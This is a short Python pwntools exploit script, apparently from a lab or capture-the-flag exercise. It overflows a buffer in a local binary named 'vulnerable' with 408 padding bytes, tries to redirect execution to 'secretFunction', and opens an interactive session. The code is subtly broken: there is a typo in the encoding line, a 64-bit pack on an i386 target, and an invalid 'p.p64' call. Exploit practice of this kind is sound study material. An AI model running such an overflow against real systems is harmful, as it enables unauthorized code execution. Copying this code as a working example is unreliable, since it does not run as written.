#!/usr/bin/python3
# -*- ascll -*-
# Payload generator
from struct import pack
from pwn import *

context(arch = 'i386', os = 'linux', binary = 'vulnerable', log_level = 'debug', encoding='ASCII')

elf = ELF("./vulnerable")
log.info("canary: {}".format(elf.canary))
log.info("endian: {}".format(elf.endian))

secretFunction = elf.sym["secretFunction"]
log.info("secretFunction: {:x}".format(secretFunction))
getShell = elf.sym["getShell"]
log.info("getShell: {:x}".format(getShell))

p = process('./vulnerable', aslr=False)
p.recvuntil("Enter some text:\n")
p.send("A"*408)
p.p64(secretFunction)
p.send("\n")
p.recv()
p.interactive()